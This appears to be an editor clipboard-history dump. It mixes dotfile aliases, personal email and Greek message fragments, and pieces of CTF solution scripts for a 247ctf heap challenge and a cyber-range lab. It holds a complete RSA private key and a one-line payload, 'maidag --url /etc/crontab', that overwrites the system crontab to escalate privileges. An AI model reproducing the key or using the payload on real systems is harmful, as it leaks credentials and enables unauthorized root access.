	+ coc-json	1.2.6	~/.config/coc/extensions/node_modules/coc-json
	+ coc-java	1.4.12	~/.config/coc/extensions/node_modules/coc-java
	+ coc-go	0.8.0	~/.config/coc/extensions/node_modules/coc-go
5c7b5be7ca206aa32e06ab74904eeddb|file:///tmp/neomutt-neo-1000-809929-5358455520343910422|7|58|v|mail
	asking
3cf0fe8c7d7650073095640e53a0260b|file:///tmp/neomutt-neo-1000-809929-5358455520343910422|20|11|v|mail
	Christou
fa46005ef620361f25cc3b3e47a27cf4|file:///tmp/neomutt-neo-1000-809929-5358455520343910422|19|1|V|mail
	Thank you,
d834d366215ba5a48f3a321b45f16e96|file:///tmp/neomutt-neo-1000-809929-5358455520343910422|25|29|v|mail
	I also tried to follow a tutorial and write
6651b09f9dc32c456856412727d0fc1b|file:///tmp/neomutt-neo-1000-809929-5358455520343910422|27|1|V|mail
	a simple pass, just to get a basic idea of how passes are written. 
872377b5dfddf6fc95300d916a5595a3|file:///home/neo/cyberranges/work/arcc/crypto/crypto.txt|2|6|v|text
	 b'\x15\x87\xb0\xf0\x87\x7fT\xeeFK\xcf\r\xbe5+U'
c43c6a2c0fe59cad93b3e70a76a441e3|file:///home/neo/cyberranges/work/arcc/crypto/crypto.txt|3|5|v|text
	 b'\x82\x05\xe1\xc8\x80\xebZ\xfe\xadG)8t\xc7\xd4\x8e'
c504f1ffee349a9c662d5b3c358c891d|file:///home/neo/cyberranges/work/arcc/crypto/crypto.txt|4|13|v|text
	 b'\x1d\\=\xe8\x97\xc1\x20\x93\xa1\x99\x8ce{\xbb\n\xfc\x8aS\xea\x822\xcfO9|\x8e'
0ea72ae7f56c3ebed8ebc9e3d4b92dc8|file:///home/neo/cyberranges/work/arcc/pwn/chall.c|12|1|V|c
	void main(){
6d1d8500a460ef47a3356ad918be9d1b|file:///home/neo/cyberranges/work/arcc/pwn/chall.c|12|3|V|c
	  setvbuf(stdout,(char *)0x0,2,0);
	  setvbuf(stderr,(char *)0x0,2,0);
ff23547a98aec1c4894aa29213ddedf4|file:///home/neo/.fzf.zsh|13|9|v|zsh
	/home/neo/.vim/bundle/fzf/shell/key-bindings.zsh
f496ea70b83137a1fb434c8bd9785ffd|file:///home/neo/cyberranges/work/arcc/crypto/crypto.txt|1|1|V|text
	Algorithm: AES OFB mode
690bba5b15de56cdf35275e1bbdd5244|file:///home/neo/cyberranges/work/arcc/pwn/sol.py|47|1|V|python
	WIN = 0x08049216
1a17658f8ae30ef478adb3b4fa2ceeef|file:///home/neo/cyberranges/work/arcc/pwn/sol/sol.py|32|1|V|python
	        elif args.GEF:
	            gs = '''
	            init-gef
	            '''
	            return gdb.debug(exe.path, gs)
03ce1101e113a369cf57ec02ea8d2f8c|file:///home/neo/cyberranges/work/arcc/pwn/sol/sol.py|26|1|V|python
	        if args.PWNDBG:
	            gs = '''
	            init-pwndbg
	            b main
	            '''
	            return gdb.debug(exe.path, gs)
	        else:
2f39f89f2d4ae108f6fbf2f8b586324d|file:///home/neo/cyberranges/work/arcc/pwn/sol/sol.py|27|1|V|python
	
	def log_addr(name, addr):
	    log.info('{}: {:#x}'.format(name, addr))
d2166b4823a53806584194137fcbca85|file:///home/neo/cyberranges/work/arcc/pwn/docker-build.sh|1|25|v|sh
	the-weapon
9527fdd281336b08d468ba271240d466|file:///home/neo/247ctf/pwnable/sol_flagstore.py|43|1|V|python
	    io.recvuntil('-\n')
3a6aeb0ea259760cabe3f3aacf285f3f|file:///home/neo/247ctf/pwnable/sol_flagstore.py|56|5|V|python
	    iol
ffd2f22c0d9334efd56c32632d20e3f6|file:///home/neo/247ctf/pwnable/sol_flagstore.py|43|1|V|python
	    io.recvuntil('-\n')
	    io.sendline('add')
	    io.recvuntil('length: \n')
	    io.sendline(str(length))
	    io.recvuntil('value \n')
	    io.sendline(str(value))
	    io.recvuntil('id \n')
	    io.sendline(str(challid))
	    io.recvuntil('score \n')
	    io.sendline(str(score))
3772927a144176a04f994b697668a1cc|file:///home/neo/247ctf/pwnable/sol_flagstore.py|60|1|V|python
	    io.recvuntil('-\n')
	    io.sendline('edit')
de95b43bceeb4b998aed4aed5cef1ae7|file:///home/neo/247ctf/pwnable/sol_flagstore.py|73|18|v|python
	edit
d5d4f82bee2b7b8d592fdfd1cf93138a|file:///home/neo/247ctf/pwnable/sol_flagstore.py|72|1|V|python
	    io.recvuntil('-\n')
	    io.sendline('delete')
099af53f601532dbd31e0ea99ffdeb64|file:///home/neo/247ctf/pwnable/sol_flagstore.py|77|18|v|python
	delete
e382852f04d7d7d131bc0fa2c4cf8cc9|file:///home/neo/247ctf/pwnable/sol_flagstore.py|10|67|v|python
	50113
cc5587dc9cdc080c70613be0ace2caf8|file:///home/neo/247ctf/pwnable/sol_flagstore.py|10|21|v|python
	67823e3dfa3877d4.247ctf.com
cc5587dc9cdc080c70613be0ace2caf8|file:///home/neo/247ctf/pwnable/sol_flagstore.py|10|21|v|python
	67823e3dfa3877d4.247ctf.com
186495f7da296bf880df3a22a492b378|file:///home/neo/247ctf/pwnable/sol_flagstore.py|89|1|v|python
	MAIN
0e306aba59901808bbb9b2b16256cc85|file:///home/neo/.config/aliasrc|1|1|V|
	# set ctll to right alt_ctl
3b30e11d836c594d3ae8c0e894025f46|file:///home/neo/.config/aliasrc|2|1|V|
	# Swap caps with escape
e9fabba1463a7bd310a875e1c653e044|file:///home/neo/.config/aliasrc|8|1|V|conf
	# Add an "alert" alias for long running commands.  Use like so:
	#   sleep 10; alert
8778f5cc5ee1685fb97ad92e33e63225|file:///home/neo/.config/aliasrc|1|3|v|conf
	Swap
eb4923a2fdf05083cd62f95d340e8be5|file:///home/neo/.config/aliasrc|17|7|V|conf
	# Find external ip address
	ip-ext='curl ipinfo.io/ip' \
f9e55d5bc0b32701423bfc831623ecb6|file:///home/neo/.config/aliasrc|5|1|V|conf
	# Upgrade all pip packages
785f706b9e9f232d25cf67e55ed7b065|file:///home/neo/.zshrc|50|5|V|zsh
	    #alias dir='dir --color=auto'
	    #alias vdir='vdir --color=auto'
080d5d87f8f24acd5744feedcb600a33|file:///home/neo/.zshrc|49|1|V|zsh
	    alias ls='exa --color=always --group-directories-first'
	    alias grep='grep --color=auto'
	    alias fgrep='fgrep --color=auto'
	    alias egrep='egrep --color=auto'
7f0cea4056c8450553d6bcc272582c25|file:///home/neo/.zshrc|115|1|V|zsh
	alias install="sudo apt-get install"
	alias python3="ipython"
cc847aa177983efb877cf9c666f1b17b|file:///home/neo/.config/aliasrc|3|3|v|conf
	Grep colors
9dcbc17d0856dbb584c8c8b251f8e628|file:///home/neo/.config/aliasrc|3|1|V|conf
	# General
	alias grep='grep --color=auto'
	alias fgrep='fgrep --color=auto'
	alias egrep='egrep --color=auto'
	alias install="sudo apt-get install"
7a5f90322df96d734c9ded3de69cdb16|file:///home/neo/.config/aliasrc|13|1|V|conf
	alias ls='exa --color=always --group-directories-first'
41e2285a92c33586b1fe50e3a38e1085|file:///home/neo/.config/aliasrc|15|1|V|conf
	alias lt='exa'
6e110f141a667783293bcf52615fc5ee|file:///tmp/neomutt-neo-1000-4590-14062648027508242376|2|1|v|mail
	yet 
473a1f17516fe254e8758ec734b67858|file:///home/neo/.config/i3/config|198|1|V|conf
	exec_always --no-startup-id $HOME/.config/polybar/launch.sh
	exec_always --no-startup-id $HOME/.config/polybar/scripts/launchlistener.sh
	exec_always --no-startup-id sxhkd -c ~/.config/sxhkd/sxhkdrc
	
d7809dcdccb3320b61a441cf05ceb426|file:///home/neo/cyberranges/work/arcc/pwn/sol/sol.py|9|1|V|python
	host = args.HOST or ''
1879e4c95ecdc6f6fa33d61314ea6b68|file:///tmp/neomutt-neo-1000-147836-9333692529099646099|3|38|v|mail
	going to join Brown as a PhD
fefbdbbdcbc63a9c6209f172fcff9bc1|file:///tmp/neomutt-neo-1000-147836-9333692529099646099|4|9|v|mail
	twhs
5230b32a6327960fd5a0880287c67983|file:///tmp/neomutt-neo-1000-147836-9333692529099646099|5|11|v|mail
	until January 
2fbbf10d4daa01e4d487ac0ff977481c|file:///home/neo/247ctf/pwnable/sol_flagstore.py|89|1|V|python
	PRINT_MENU_ADDR = 0x8048d03
	MAIN_ADDR = 0x8048da3
	DEBUG_ADDR = 0x8048686
	ADD_FLAG_ADDR = 0x80487b3
	EDIT_FLAG_ADDR = 0x8048a31
	DELETE_FLAG_ADDR = 0x8048bfa
	PRINT_FLAGS_ADDR = 0x8048712
a947a2ae0ad6f3ed1aa68f9466ba307a|file:///home/neo/247ctf/pwnable/sol_flagstore.py|29|1|V|python
	PRINT_MENU_ADDR = 0x8048d03
ae8e33c780c023a7c0a275dab1e8ac5e|file:///home/neo/247ctf/pwnable/sol_flagstore.py|29|1|V|python
	MAIN_ADDR = 0x8048da3
dbce4f62726d4f67b30fdf776187296a|file:///home/neo/247ctf/pwnable/sol_flagstore.py|29|1|V|python
	DEBUG_ADDR = 0x8048686
9639928884d83cacfc7dbac0aa430755|file:///home/neo/247ctf/pwnable/sol_flagstore.py|30|1|v|python
	EDIT_FLAG_ADDR 
414aeb171d942e0fc049698676c6fa22|file:///home/neo/247ctf/pwnable/sol_flagstore.py|31|1|v|python
	DELETE_FLAG_ADDR =
34b990551cc94fd69a0eab9fdb4b6db2|file:///home/neo/247ctf/pwnable/sol_flagstore.py|32|1|v|python
	PRINT_FLAGS_ADDR =
e5867c0fab52c57ceaf24fc5bc271949|file:///home/neo/247ctf/pwnable/sol_flagstore.py|107|1|V|python
	add_flag(5, 'aaaa', 5, 5)
65ba841e01d6db7733e90a5b7f9e6f80|file:///home/neo/247ctf/pwnable/sol_flagstore.py|111|15|v|python
	bbbb
8bf6b3fa2619583ed78912ef2a35d49f|file:///home/neo/247ctf/pwnable/sol_flagstore.py|108|1|V|python
	add_flag()
3b5feca2560eca9215ff737d3c85afbc|file:///home/neo/247ctf/pwnable/sol_flagstore.py|110|1|V|python
	print(flags)
71bee1b171ca1330e0343114c4dd437a|file:///home/neo/247ctf/pwnable/sol_flagstore.py|109|1|V|python
	flags = print_flags()
2fb761e4d6e9c56f47587e7e7df84af2|file:///home/neo/247ctf/pwnable/sol_flagstore.py|113|1|v|python
	flags =
3a20c1d21cb966958ab0cfbedda5c282|file:///home/neo/247ctf/pwnable/sol_flagstore.py|108|1|V|python
	add_flag(32, 'bbbb', 2, 2)
ab370b3373f2042ce1c7e62f0c2a4063|file:///home/neo/247ctf/pwnable/sol_flagstore.py|112|1|V|python
	delete_flag(0)
cce5ffa01a3c68375ceb42fc92c7558f|file:///home/neo/247ctf/pwnable/sol_flagstore.py|87|1|V|python
	    resp = io.recvuntil('Enter', drop=True)
	    return resp
b552f2e2d0b2e46516e20a45cfd9506e|file:///home/neo/247ctf/pwnable/sol_flagstore.py|115|1|V|python
	print(resp)
ae429afff9db109c0c13ef40fd9fa190|file:///home/neo/247ctf/pwnable/sol_flagstore.py|113|1|V|python
	# edit_flag(0, 'cccc', 3, 3)
c0647ded8906ccedaa7642878c4a6f05|untitled:1|1|1|V|
	Hello George! ŒïŒπŒºŒ±Œπ Œ±œÄŒø ŒöœÖœÄœÅŒø Œ∫Œ±Œπ Œ∏Œ± ŒµœÅŒ∏œâ œÉœÑŒø Brown Œ≥ŒπŒ± phd (ŒµŒªœÄŒπŒ∂œâ) œÑŒø ŒµœÄŒøŒºŒµŒΩŒø semester. ŒúŒøŒªŒπœÇ ŒºŒπŒªŒøœÖœÉŒ± ŒºŒµ œÑŒøŒΩ Connor Œ∫Œ±Œπ ŒºŒøœÖ ŒµœáŒµŒπ œÄœÅŒøœÑŒµŒπŒΩŒµŒπ ŒΩŒ± ŒºŒπŒªŒ∑œÉœâ ŒºŒ±Œ∂Œπ œÉŒøœÖ, ŒµŒªœÄŒπŒ∂œâ ŒΩŒ± ŒºŒ∑ŒΩ ŒµŒΩŒøœáŒªœâ. 
8b1a9953c4611296a827abf8c47804d7|untitled:1|1|1|v|
	Hello
1b3810e00cfa7c352848b6e7a9db95a1|untitled:1|1|134|v|
	semester
f2bb8084cf08725139021974f5e05fb2|untitled:1|1|1|V|
	ŒìŒµŒπŒ± œÉŒøœÖ George! ŒïŒπŒºŒ±Œπ Œ±œÄŒø ŒöœÖœÄœÅŒø Œ∫Œ±Œπ Œ∏Œ± ŒµœÅŒ∏œâ œÉœÑŒø Brown Œ≥ŒπŒ± phd (ŒµŒªœÄŒπŒ∂œâ) œÑŒø ŒµœÄŒøŒºŒµŒΩŒø ŒµŒæŒ±ŒºŒ∑ŒΩŒø.
1078269f67b57c5d635f85f2d2550f38|untitled:1|1|1|V|
	ŒúŒøŒªŒπœÇ ŒºŒπŒªŒøœÖœÉŒ± ŒºŒµ œÑŒøŒΩ Connor Œ∫Œ±Œπ ŒºŒøœÖ ŒµœáŒµŒπ œÄœÅŒøœÑŒµŒπŒΩŒµŒπ ŒΩŒ± ŒºŒπŒªŒ∑œÉœâ ŒºŒ±Œ∂Œπ œÉŒøœÖ, ŒµŒªœÄŒπŒ∂œâ ŒΩŒ± ŒºŒ∑ŒΩ ŒµŒΩŒøœáŒªœâ. 
8976e1fa4e904d562d4bcfb433f92ea8|file:///home/neo/247ctf/pwnable/sol_flagstore.py|117|20|V|python
	resp = delete_flag(0)
	print(resp)
cd2d381fdf01d847b8b17805445efde4|file:///home/neo/247ctf/pwnable/sol_flagstore.py|113|1|V|python
	flags = print_flags()
	print(flags)
70a23478cb3af21540f045ad2b9fd258|file:///home/neo/247ctf/pwnable/sol_flagstore.py|118|1|V|python
	resp = edit_flag(0, 'cccc', 3, 3)
328bfcaba5cafd10d5ebf2af557e3ceb|file:///home/neo/247ctf/pwnable/sol_flagstore.py|115|1|V|python
	resp = delete_flag(0)
bd86bced84fb3aef951fb07de8c533c7|file:///home/neo/247ctf/pwnable/sol_flagstore.py|79|12|v|python
	resp
382e7f0dec66963761630e695ac87869|file:///home/neo/247ctf/pwnable/sol_flagstore.py|118|1|V|python
	resp = delete_flag(2)
6413e464e4afca9a60632f6db6cb390a|file:///home/neo/247ctf/pwnable/sol_flagstore.py|113|1|V|python
	add_flag(16, 'aaaa', 1, 1)
1a4a8ba0cfb61ceab822df57bad7a4c4|file:///home/neo/247ctf/pwnable/sol_flagstore.py|124|1|V|python
	next_free = edit_flag(0, 'cccc', 3, 3)
7a5f3fcd33f43d80dd07fe4e878bc74e|file:///home/neo/247ctf/pwnable/sol_flagstore.py|120|1|V|python
	resp = delete_flag(1)
28c48db4705dd57f25c7bfc81a9a5c65|file:///home/neo/247ctf/pwnable/sol_flagstore.py|119|1|V|python
	# print(resp)
810566aa39ba481bb7280cfcba367516|file:///home/neo/247ctf/pwnable/sol_flagstore.py|116|1|V|python
	# resp = delete_flag(2)
	# print(resp)
	# resp = delete_flag(0)
	# print(resp)
b3c17aefda1f9e9a184c141849d0d56b|file:///home/neo/247ctf/pwnable/sol_flagstore.py|119|1|V|python
	# add_flag(16, 'dddd', 4, 4)
b97a14f43dea99ad8d7f0b2948ae842d|file:///home/neo/247ctf/pwnable/sol_flagstore.py|117|1|V|python
	next_free = edit_flag(1, 'cccc', 3, 3)
efd010593960a252d629d05a87552c4f|file:///home/neo/.config/aliasrc|31|31|V|conf
	# Stop and remove all running docker containers
	alias docker-rm-all="docker stop `docker ps -aq` && docker rm `docker ps -aq`"
68e84d18a261d05b3fdaceb42b563772|file:///home/neo/cyberranges/work/mitre/easy13/docker-compose.yml|6|1|V|yaml
	    image: rastasheep/ubuntu-sshd
38737de6773b6ecf9da8309d4050c908|file:///home/neo/cyberranges/work/mitre/easy13/docker-compose.yml|17|5|V|yaml
	    build: .
c93f8fe1f673724b99237b858fb3a019|file:///home/neo/cyberranges/work/mitre/easy13/docker-compose.yml|6|34|v|yaml
	:16.04
5eb093c751e93018af0456e0fe65f01e|file:///home/neo/cyberranges/neochr-27b5d7d7-73cb-421c-be9d-de7dfed00d13.pem|1|1|V|
	-----BEGIN RSA PRIVATE KEY-----
	MIIEpAIBAAKCAQEA2WFGZHHtE3b4AVqPw6pgwp9fqSq4aLPAB5ajS+yqYO/W8CUg
	7EHHZi3i+nyZUjxFSSuuamLZxYu2usSBsNrIJCQVhnVyLsh14BL14QT5Ok11VBjX
	02kV+Yn4l6fNxiYMX5UQ+G91s2gRaT8FxXFTFDKdCYyXdNts9onAnRSP086LQvUE
	vdVwHcg1wW0Jm4dNACZLndyxPwylFyZr582rorZ5IhkxYV2Rg48b3Fk37f90yXUY
	zXovshAIwv1dV3pwftAt/09iyXo6pWWr25DhrsGkGnhU/eZ0N/eUWHPxo1xe/GTU
	XGwN4toOUkBhMLT13vN4UxO5jH/3yygPyfP2hQIDAQABAoIBADfUg//IQtt88rVm
	TQYz/CYASNFp53L8t5U7WzVk012SO+Hxp0MGoe/cWS98UOSOFj10upcYTFYwS/4r
	+iMyDbU6j0y5XVomoh+qvvvMCzauLjQrLUNe+gXdKbvJnVAG9aaW4oTsG464a8Bc
	L19Ge8/0L+ED+uJIePPY7V9qqIX9TRAvMD1CrSBFad4hqv2TXyDu6emOGOSqeEYo
	uAFI4di9AZiApWTKdJqrdeLIQM94AUN1WPqB6yUdMgIP1nvJ5WgVfRpAfoVhag8y
	00MsGg8l2AFOMNGU2m/botSkjdcut9tTmGcHxox4Sz0jRj3/KRdzqoKiF+jvED8H
	5mPiiAECgYEA8fY8VDoMMa3v1tR3sIo0VmuOcZcPZDv7+yyPLbFFWBDMjJts0bPg
	rh82VeKYKcFQyp30t/hlUCy44sIb/MHeVczbCyLK7K3iJ8dcxwbHpf+Ph5O2jPuR
	frEAnq02bnxojNI+lI0TgFj1UkGN1S7AN/2JSVfocSILfW0NWskBrwkCgYEA5f3v
	MUyAkZ3MiTbCl9zJR4yXr8yFO7E/613r9JIEYqH99uf6RsYRbgVw2yxl/UQnHB/2
	steXtRJasLjSZzilVU+5MbWeXa8QDULTzphyKEn3HOeDshyG59QDVFOF/d0HD1XH
	C1Q1yo3N/HgkYaVnAaxqJ1dy6NtC8GtdTSi4Lp0CgYEA1MA3UbPsru4K2jHdv/v1
	gxt1l0lE/lSD/tmyV3Hs0D+NLAEp0MXCRDgrlZ71Ppm9STtUR0MBClsYgkI9S6TH
	s1e6LnN8TFmkZme0m0fJ2pr4gDSQqiw1RVmretpA5ys63r+qyQG26P7PTnFXneBK
	obCruzKxrnBJ/BIcUPw3H8kCgYEA5COVTlC1xDxEdOPV+XAwVQH4QZFdpA25+w5q
	jWr+YJyR4IbSM7wr8/f/r9mFvcoKBZMLUvIa8amoPl7Hj06YalyvtsiStBmAkbb1
	hZyguKhOMOTSNS6o/3PGbbKAWocShrquu+UniqpJZyQB6r54xCc0EZxkRumgp/3I
	Sk6XDN0CgYBFwykXslDJQ8zUotv+3eJlNDENZFzN+68YUax3HcmK6ZcTDG/uG9Iw
	eIdO6eKpkFgVUBhx4YvY1Bwl756052E58fd9JHNNdLkQ7GnebPn93GENeJxNa7Yz
	LD9qWWbDhvHhRg3TocdEuSWWdXryOfQEGXlX1LGkoNXIL/4AUNCnJw==
	-----END RSA PRIVATE KEY-----
83047bbcd44be30ba29fcfbcf401bc42|file:///home/neo/.vimrc|293|1|V|vim
	" Tagbar 
	nmap <F8> :TagbarToggle<CR>
c2733b108db18579ae6167d7b231b641|file:///tmp/payload.sh|1|1|V|sh
	maidag --url /etc/crontab < /tmp/crontab.in
17e48014591691f479b98e07fa666c74|file:///home/neo/cyberranges/work/mitre/scenarios.md|55|13|V|vimwiki
	            - Need to set up typo3
b004f28f3ca36b2913094326d44ce9d4|file:///home/neo/.vim/bundle/coc.nvim/package.json|99|1|V|json
	    "node-gyp": "^7.1.0",
